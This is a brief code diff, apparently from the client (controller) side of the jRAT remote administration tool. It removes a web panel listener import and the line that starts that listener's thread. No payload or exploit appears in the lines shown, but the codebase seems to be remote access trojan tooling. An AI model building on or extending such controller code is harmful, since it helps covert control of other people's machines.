@@ -30,7 +30,6 @@ import se.jrat.client.threads.ThreadPing;
 import se.jrat.client.ui.dialogs.DialogEula;
 import se.jrat.client.ui.frames.Frame;
 import se.jrat.client.utils.TrayIconUtils;
-import se.jrat.client.webpanel.WebPanelListener;
 import se.jrat.common.Logger;
 import se.jrat.common.Version;
 
@@ -159,7 +158,6 @@ public class Main {
 		new ThreadCheckVersion().start();
 		new Thread(new RunnableCheckPlugins()).start();
 		new ThreadPing().start();
-		new Thread(new WebPanelListener()).start();
 
 		instance.setVisible(true);
 
